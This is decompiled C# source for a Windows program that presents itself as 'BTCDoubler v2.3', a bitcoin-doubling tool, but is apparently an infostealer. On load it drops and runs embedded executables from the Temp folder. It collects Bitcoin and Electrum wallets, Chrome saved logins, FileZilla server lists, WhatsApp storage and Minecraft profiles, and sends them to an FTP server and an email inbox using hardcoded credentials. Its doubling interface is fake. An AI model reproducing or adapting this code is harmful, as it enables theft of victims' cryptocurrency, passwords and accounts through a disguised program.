using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTCDoubler_v2._3.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace BTCDoubler_v2._3;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("label6")]
	private Label label_0;

	[AccessedThroughProperty("label7")]
	private Label label_1;

	[AccessedThroughProperty("label5")]
	private Label label_2;

	[AccessedThroughProperty("maskedTextBox2")]
	private MaskedTextBox maskedTextBox_0;

	[AccessedThroughProperty("label4")]
	private Label label_3;

	[AccessedThroughProperty("maskedTextBox1")]
	private MaskedTextBox maskedTextBox_1;

	[AccessedThroughProperty("button1")]
	private Button button_0;

	[AccessedThroughProperty("label1")]
	private Label label_4;

	[AccessedThroughProperty("pictureBox1")]
	private PictureBox pictureBox_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar progressBar_0;

	[AccessedThroughProperty("Button3")]
	private Button button_1;

	[AccessedThroughProperty("Button2")]
	private Button button_2;

	[AccessedThroughProperty("Button4")]
	private Button button_3;

	private string string_0;

	private string string_1;

	private WebClient webClient_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string_1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		webClient_0 = new WebClient();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_020c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0216: Expected O, but got Unknown
		//IL_0305: Unknown result type (might be due to invalid IL or missing references)
		//IL_030f: Expected O, but got Unknown
		//IL_03df: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e9: Expected O, but got Unknown
		//IL_0471: Unknown result type (might be due to invalid IL or missing references)
		//IL_047b: Expected O, but got Unknown
		//IL_04fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0504: Expected O, but got Unknown
		//IL_0698: Unknown result type (might be due to invalid IL or missing references)
		//IL_06a2: Expected O, but got Unknown
		//IL_0835: Unknown result type (might be due to invalid IL or missing references)
		//IL_083f: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		vmethod_1(new Label());
		vmethod_3(new Label());
		vmethod_5(new Label());
		vmethod_7(new MaskedTextBox());
		vmethod_9(new Label());
		vmethod_11(new MaskedTextBox());
		vmethod_13(new Button());
		vmethod_15(new Label());
		vmethod_17(new PictureBox());
		vmethod_19(new Timer(icontainer_0));
		vmethod_21(new ProgressBar());
		vmethod_23(new Button());
		vmethod_25(new Button());
		vmethod_27(new Button());
		((ISupportInitialize)vmethod_16()).BeginInit();
		((Control)this).SuspendLayout();
		vmethod_0().set_AutoSize(true);
		((Control)vmethod_0()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)vmethod_0()).set_ForeColor(Color.Black);
		Label obj = vmethod_0();
		Point location = new Point(420, 213);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("label6");
		Label obj2 = vmethod_0();
		Size size = new Size(40, 13);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(41);
		vmethod_0().set_Text("(Copy!)");
		vmethod_2().set_AutoSize(true);
		((Control)vmethod_2()).set_Font(new Font("Microsoft Sans Serif", 20.25f));
		Label obj3 = vmethod_2();
		location = new Point(50, 268);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("label7");
		Label obj4 = vmethod_2();
		size = new Size(363, 31);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(39);
		vmethod_2().set_Text("Click after one Coinfirmation:");
		vmethod_4().set_AutoSize(true);
		((Control)vmethod_4()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)vmethod_4()).set_ForeColor(Color.Black);
		Label obj5 = vmethod_4();
		location = new Point(1, 168);
		((Control)obj5).set_Location(location);
		((Control)vmethod_4()).set_Name("label5");
		Label obj6 = vmethod_4();
		size = new Size(209, 13);
		((Control)obj6).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(38);
		vmethod_4().set_Text("The Coins you want to double go 2:");
		MaskedTextBox obj7 = vmethod_6();
		location = new Point(4, 190);
		((Control)obj7).set_Location(location);
		((Control)vmethod_6()).set_Name("maskedTextBox2");
		MaskedTextBox obj8 = vmethod_6();
		size = new Size(456, 20);
		((Control)obj8).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(37);
		vmethod_6().set_Text("12iGugxGfn259Nea4KELhd14gwkxuxATK5");
		vmethod_8().set_AutoSize(true);
		((Control)vmethod_8()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)vmethod_8()).set_ForeColor(Color.Black);
		Label obj9 = vmethod_8();
		location = new Point(1, 223);
		((Control)obj9).set_Location(location);
		((Control)vmethod_8()).set_Name("label4");
		Label obj10 = vmethod_8();
		size = new Size(121, 13);
		((Control)obj10).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(36);
		vmethod_8().set_Text("The Transaction-ID:");
		MaskedTextBox obj11 = vmethod_10();
		location = new Point(4, 245);
		((Control)obj11).set_Location(location);
		((Control)vmethod_10()).set_Name("maskedTextBox1");
		MaskedTextBox obj12 = vmethod_10();
		size = new Size(456, 20);
		((Control)obj12).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(35);
		((Control)vmethod_12()).set_Font(new Font("Microsoft Sans Serif", 26.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Button obj13 = vmethod_12();
		location = new Point(4, 302);
		((Control)obj13).set_Location(location);
		((Control)vmethod_12()).set_Name("button1");
		Button obj14 = vmethod_12();
		size = new Size(456, 49);
		((Control)obj14).set_Size(size);
		((Control)vmethod_12()).set_TabIndex(34);
		((ButtonBase)vmethod_12()).set_Text("Send Coins!");
		((ButtonBase)vmethod_12()).set_UseVisualStyleBackColor(true);
		vmethod_14().set_AutoSize(true);
		((Control)vmethod_14()).set_Font(new Font("Microsoft Sans Serif", 40.25f));
		((Control)vmethod_14()).set_ForeColor(SystemColors.ControlText);
		Label obj15 = vmethod_14();
		location = new Point(17, 105);
		((Control)obj15).set_Location(location);
		((Control)vmethod_14()).set_Name("label1");
		Label obj16 = vmethod_14();
		size = new Size(441, 63);
		((Control)obj16).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(33);
		vmethod_14().set_Text("BTCDoubler v2.3");
		vmethod_16().set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		PictureBox obj17 = vmethod_16();
		location = new Point(180, 2);
		((Control)obj17).set_Location(location);
		((Control)vmethod_16()).set_Name("pictureBox1");
		PictureBox obj18 = vmethod_16();
		size = new Size(637, 544);
		((Control)obj18).set_Size(size);
		vmethod_16().set_TabIndex(32);
		vmethod_16().set_TabStop(false);
		ProgressBar obj19 = vmethod_20();
		location = new Point(4, 376);
		((Control)obj19).set_Location(location);
		((Control)vmethod_20()).set_Name("ProgressBar1");
		ProgressBar obj20 = vmethod_20();
		size = new Size(456, 17);
		((Control)obj20).set_Size(size);
		((Control)vmethod_20()).set_TabIndex(42);
		Button obj21 = vmethod_22();
		location = new Point(366, 2);
		((Control)obj21).set_Location(location);
		((Control)vmethod_22()).set_Name("Button3");
		Button obj22 = vmethod_22();
		size = new Size(47, 31);
		((Control)obj22).set_Size(size);
		((Control)vmethod_22()).set_TabIndex(44);
		((ButtonBase)vmethod_22()).set_Text("Close");
		((ButtonBase)vmethod_22()).set_UseVisualStyleBackColor(true);
		Button obj23 = vmethod_24();
		location = new Point(413, 2);
		((Control)obj23).set_Location(location);
		((Control)vmethod_24()).set_Name("Button2");
		Button obj24 = vmethod_24();
		size = new Size(47, 31);
		((Control)obj24).set_Size(size);
		((Control)vmethod_24()).set_TabIndex(45);
		((ButtonBase)vmethod_24()).set_Text("Help");
		((ButtonBase)vmethod_24()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_26()).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button obj25 = vmethod_26();
		location = new Point(4, 352);
		((Control)obj25).set_Location(location);
		((Control)vmethod_26()).set_Name("Button4");
		Button obj26 = vmethod_26();
		size = new Size(456, 22);
		((Control)obj26).set_Size(size);
		((Control)vmethod_26()).set_TabIndex(46);
		((ButtonBase)vmethod_26()).set_Text("Reset");
		((ButtonBase)vmethod_26()).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(463, 395);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_26());
		((Control)this).get_Controls().Add((Control)(object)vmethod_24());
		((Control)this).get_Controls().Add((Control)(object)vmethod_22());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_12());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_16());
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("BTCDoubler v2.3");
		((ISupportInitialize)vmethod_16()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	private virtual Label vmethod_0()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_1(Label label_5)
	{
		label_0 = label_5;
	}

	[SpecialName]
	private virtual Label vmethod_2()
	{
		return label_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_3(Label label_5)
	{
		label_1 = label_5;
	}

	[SpecialName]
	private virtual Label vmethod_4()
	{
		return label_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_5(Label label_5)
	{
		label_2 = label_5;
	}

	[SpecialName]
	private virtual MaskedTextBox vmethod_6()
	{
		return maskedTextBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_7(MaskedTextBox maskedTextBox_2)
	{
		maskedTextBox_0 = maskedTextBox_2;
	}

	[SpecialName]
	private virtual Label vmethod_8()
	{
		return label_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_9(Label label_5)
	{
		label_3 = label_5;
	}

	[SpecialName]
	private virtual MaskedTextBox vmethod_10()
	{
		return maskedTextBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_11(MaskedTextBox maskedTextBox_2)
	{
		maskedTextBox_1 = maskedTextBox_2;
	}

	[SpecialName]
	private virtual Button vmethod_12()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_13(Button button_4)
	{
		EventHandler eventHandler = method_0;
		if (button_0 != null)
		{
			((Control)button_0).remove_Click(eventHandler);
		}
		button_0 = button_4;
		if (button_0 != null)
		{
			((Control)button_0).add_Click(eventHandler);
		}
	}

	[SpecialName]
	private virtual Label vmethod_14()
	{
		return label_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_15(Label label_5)
	{
		EventHandler eventHandler = method_2;
		if (label_4 != null)
		{
			((Control)label_4).remove_Click(eventHandler);
		}
		label_4 = label_5;
		if (label_4 != null)
		{
			((Control)label_4).add_Click(eventHandler);
		}
	}

	[SpecialName]
	private virtual PictureBox vmethod_16()
	{
		return pictureBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_17(PictureBox pictureBox_1)
	{
		EventHandler eventHandler = method_1;
		if (pictureBox_0 != null)
		{
			((Control)pictureBox_0).remove_Click(eventHandler);
		}
		pictureBox_0 = pictureBox_1;
		if (pictureBox_0 != null)
		{
			((Control)pictureBox_0).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_18()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_19(Timer timer_1)
	{
		EventHandler eventHandler = method_6;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_1;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual ProgressBar vmethod_20()
	{
		return progressBar_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_21(ProgressBar progressBar_1)
	{
		progressBar_0 = progressBar_1;
	}

	[SpecialName]
	internal virtual Button vmethod_22()
	{
		return button_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_23(Button button_4)
	{
		EventHandler eventHandler = method_4;
		if (button_1 != null)
		{
			((Control)button_1).remove_Click(eventHandler);
		}
		button_1 = button_4;
		if (button_1 != null)
		{
			((Control)button_1).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button vmethod_24()
	{
		return button_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_25(Button button_4)
	{
		EventHandler eventHandler = method_5;
		if (button_2 != null)
		{
			((Control)button_2).remove_Click(eventHandler);
		}
		button_2 = button_4;
		if (button_2 != null)
		{
			((Control)button_2).add_Click(eventHandler);
		}
	}

	[SpecialName]
	private virtual Button vmethod_26()
	{
		return button_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_27(Button button_4)
	{
		EventHandler eventHandler = method_7;
		if (button_3 != null)
		{
			((Control)button_3).remove_Click(eventHandler);
		}
		button_3 = button_4;
		if (button_3 != null)
		{
			((Control)button_3).add_Click(eventHandler);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		WebClient webClient = default(WebClient);
		int num2 = default(int);
		int num3 = default(int);
		SmtpClient smtpClient = default(SmtpClient);
		string text = default(string);
		string password = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		MailMessage mailMessage = default(MailMessage);
		string addresses = default(string);
		string subject = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					webClient = new WebClient();
					goto IL_0008;
				case 1622:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_0054;
						case 5:
							goto IL_007a;
						case 6:
							goto IL_0097;
						case 7:
							goto IL_00b8;
						case 8:
							goto IL_0110;
						case 9:
							goto IL_0124;
						case 10:
							goto IL_0142;
						case 11:
							goto IL_014b;
						case 12:
							goto IL_0155;
						case 13:
							goto IL_015f;
						case 14:
							goto IL_0169;
						case 15:
							goto IL_0181;
						case 16:
							goto IL_0191;
						case 17:
							goto IL_01a1;
						case 18:
							goto IL_01ac;
						case 19:
							goto IL_01d9;
						case 20:
							goto IL_01e1;
						case 21:
							goto IL_01fb;
						case 22:
							goto IL_021e;
						case 23:
						case 24:
							goto IL_025a;
						case 25:
							goto IL_0274;
						case 26:
							goto IL_0297;
						case 27:
						case 28:
							goto IL_02d3;
						case 29:
							goto IL_02ed;
						case 30:
							goto IL_0310;
						case 31:
						case 32:
							goto IL_034c;
						case 33:
							goto IL_0366;
						case 34:
							goto IL_0389;
						case 35:
						case 36:
							goto IL_03c5;
						case 37:
							goto IL_03d5;
						case 38:
							goto IL_040b;
						case 39:
						case 40:
							goto IL_0432;
						case 41:
							goto IL_044c;
						case 42:
							goto IL_046f;
						case 43:
						case 44:
							goto IL_04ab;
						case 45:
							goto IL_04c5;
						case 46:
							goto IL_04e8;
						case 47:
						case 48:
							goto IL_0524;
						case 49:
							goto IL_0533;
						case 50:
							goto IL_0542;
						case 51:
							goto IL_054d;
						case 52:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 53:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_054d:
					num = 51;
					smtpClient.Credentials = new NetworkCredential(text, password);
					break;
					IL_0008:
					num = 2;
					webClient.Credentials = new NetworkCredential("mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_001f;
					IL_001f:
					num = 3;
					((ServerComputer)Class1.smethod_0()).get_FileSystem().WriteAllBytes(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\reader.exe", Resources.smethod_4(), false);
					goto IL_0054;
					IL_0054:
					num = 4;
					Process.Start(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\reader.exe");
					goto IL_007a;
					IL_007a:
					num = 5;
					text2 = DateAndTime.get_DateString() + ", " + Conversions.ToString(DateAndTime.get_TimeOfDay());
					goto IL_0097;
					IL_0097:
					num = 6;
					_ = "_" + DateAndTime.get_DateString() + "_" + Conversions.ToString(DateAndTime.get_TimeOfDay());
					goto IL_00b8;
					IL_00b8:
					num = 7;
					_ = "_" + DateAndTime.get_DateString() + "_" + Conversions.ToString(DateAndTime.get_TimeOfDay()) + "_" + webClient_0.DownloadString("http://bot.whatismyipaddress.com/");
					goto IL_0110;
					IL_0110:
					num = 8;
					text3 = webClient_0.DownloadString("http://bot.whatismyipaddress.com/");
					goto IL_0124;
					IL_0124:
					num = 9;
					text4 = "_" + webClient_0.DownloadString("http://bot.whatismyipaddress.com/");
					goto IL_0142;
					IL_0142:
					num = 10;
					mailMessage = new MailMessage();
					goto IL_014b;
					IL_014b:
					num = 11;
					text = "gangundzoo@gmx.de";
					goto IL_0155;
					IL_0155:
					num = 12;
					addresses = "jeremykingswins@gmail.com";
					goto IL_015f;
					IL_015f:
					num = 13;
					password = "Kfbiggesthsaliveyoa!!2";
					goto IL_0169;
					IL_0169:
					num = 14;
					subject = "Fresh Data-Files: " + text2 + " | " + text3;
					goto IL_0181;
					IL_0181:
					num = 15;
					mailMessage.From = new MailAddress(text);
					goto IL_0191;
					IL_0191:
					num = 16;
					mailMessage.To.Add(addresses);
					goto IL_01a1;
					IL_01a1:
					num = 17;
					mailMessage.Subject = subject;
					goto IL_01ac;
					IL_01ac:
					num = 18;
					mailMessage.Body = "IP & mehr : \r\n" + webClient_0.DownloadString("http://ip-api.com/json") + " / " + Dns.GetHostName();
					goto IL_01d9;
					IL_01d9:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_01e1;
					IL_01e1:
					num = 20;
					if (File.Exists(string_0 + "\\bitcoin\\wallet.dat"))
					{
						goto IL_01fb;
					}
					goto IL_025a;
					IL_01fb:
					num = 21;
					mailMessage.Attachments.Add(new Attachment(string_0 + "\\bitcoin\\wallet.dat"));
					goto IL_021e;
					IL_021e:
					num = 22;
					((ServerComputer)Class1.smethod_0()).get_Network().UploadFile(string_0 + "\\bitcoin\\wallet.dat", "ftp://mulasystem.bplaced.net/Geldleben/BitcoinWallet/wallet" + text4 + ".dat", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_025a;
					IL_025a:
					num = 24;
					if (File.Exists(string_0 + "\\Electrum\\wallets\\default_wallet."))
					{
						goto IL_0274;
					}
					goto IL_02d3;
					IL_0274:
					num = 25;
					mailMessage.Attachments.Add(new Attachment(string_0 + "\\Electrum\\wallets\\default_wallet."));
					goto IL_0297;
					IL_0297:
					num = 26;
					((ServerComputer)Class1.smethod_0()).get_Network().UploadFile(string_0 + "\\Electrum\\wallets\\default_wallet.", "ftp://mulasystem.bplaced.net/Geldleben/Electrum/default_wallet" + text4 + ".", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_02d3;
					IL_02d3:
					num = 28;
					if (File.Exists(string_0 + "\\.minecraft\\launcher_profiles.json"))
					{
						goto IL_02ed;
					}
					goto IL_034c;
					IL_02ed:
					num = 29;
					mailMessage.Attachments.Add(new Attachment(string_0 + "\\.minecraft\\launcher_profiles.json"));
					goto IL_0310;
					IL_0310:
					num = 30;
					((ServerComputer)Class1.smethod_0()).get_Network().UploadFile(string_0 + "\\.minecraft\\launcher_profiles.json", "ftp://mulasystem.bplaced.net/Geldleben/Minecraft/launcher_profiles" + text4 + ".json", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_034c;
					IL_034c:
					num = 32;
					if (File.Exists(string_0 + "\\FileZilla\\recentservers.xml"))
					{
						goto IL_0366;
					}
					goto IL_03c5;
					IL_0366:
					num = 33;
					mailMessage.Attachments.Add(new Attachment(string_0 + "\\FileZilla\\recentservers.xml"));
					goto IL_0389;
					IL_0389:
					num = 34;
					((ServerComputer)Class1.smethod_0()).get_Network().UploadFile(string_0 + "\\FileZilla\\recentservers.xml", "ftp://mulasystem.bplaced.net/Geldleben/FileZilla/recentservers" + text4 + ".xml", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_03c5;
					IL_03c5:
					num = 36;
					if (method_3("chrome"))
					{
						goto IL_03d5;
					}
					goto IL_0432;
					IL_03d5:
					num = 37;
					((ServerComputer)Class1.smethod_0()).get_FileSystem().WriteAllBytes(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\crprcss.exe", Resources.smethod_3(), false);
					goto IL_040b;
					IL_040b:
					num = 38;
					Process.Start(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\crprcss.exe");
					goto IL_0432;
					IL_0432:
					num = 40;
					if (File.Exists(string_1 + "\\Google\\Chrome\\User Data\\Default\\Login Data."))
					{
						goto IL_044c;
					}
					goto IL_04ab;
					IL_044c:
					num = 41;
					mailMessage.Attachments.Add(new Attachment(string_1 + "\\Google\\Chrome\\User Data\\Default\\Login Data."));
					goto IL_046f;
					IL_046f:
					num = 42;
					((ServerComputer)Class1.smethod_0()).get_Network().UploadFile(string_1 + "\\Google\\Chrome\\User Data\\Default\\Login Data.", "ftp://mulasystem.bplaced.net/Geldleben/Chrome/Login Data" + text4 + ".", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_04ab;
					IL_04ab:
					num = 44;
					if (File.Exists(string_0 + "\\WhatsApp\\Local Storage\\file__0.localstorage"))
					{
						goto IL_04c5;
					}
					goto IL_0524;
					IL_04c5:
					num = 45;
					mailMessage.Attachments.Add(new Attachment(string_0 + "\\WhatsApp\\Local Storage\\file__0.localstorage"));
					goto IL_04e8;
					IL_04e8:
					num = 46;
					((ServerComputer)Class1.smethod_0()).get_Network().UploadFile(string_0 + "\\WhatsApp\\Local Storage\\file__0.localstorage", "ftp://mulasystem.bplaced.net/Geldleben/WhatsApp/file__0" + text4 + ".localstorage", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_0524;
					IL_0524:
					num = 48;
					smtpClient = new SmtpClient("mail.gmx.net");
					goto IL_0533;
					IL_0533:
					num = 49;
					smtpClient.Port = 587;
					goto IL_0542;
					IL_0542:
					num = 50;
					smtpClient.EnableSsl = true;
					goto IL_054d;
					end_IL_0000_2:
					break;
				}
				num = 52;
				smtpClient.Send(mailMessage);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1622;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_0(object sender, EventArgs e)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(vmethod_10().get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please fill in your Transaction-ID.", (MsgBoxStyle)64, (object)"Hack failed");
		}
		else
		{
			vmethod_18().Start();
		}
	}

	private void method_1(object sender, EventArgs e)
	{
	}

	private void method_2(object sender, EventArgs e)
	{
	}

	private bool method_3(string string_2)
	{
		if (Process.GetProcessesByName(string_2).Length > 0)
		{
			return true;
		}
		return false;
	}

	private void method_4(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void method_5(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"If nothing happens theres no confirmation of the transaction.", (MsgBoxStyle)64, (object)"Help");
	}

	private void method_6(object sender, EventArgs e)
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					vmethod_20().Increment(1);
					goto IL_000e;
				case 126:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000e;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_002f;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_002f:
					num = 4;
					vmethod_18().Stop();
					break;
					IL_000e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0015;
					IL_0015:
					num = 3;
					if (vmethod_20().get_Value() != vmethod_20().get_Maximum())
					{
						goto end_IL_0000_3;
					}
					goto IL_002f;
					end_IL_0000_2:
					break;
				}
				num = 5;
				Interaction.MsgBox((object)"The coins have been successfully sent to your wallet!", (MsgBoxStyle)64, (object)"Successful!");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 126;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_7(object sender, EventArgs e)
	{
		vmethod_20().set_Value(0);
		((TextBoxBase)vmethod_10()).Clear();
	}
}
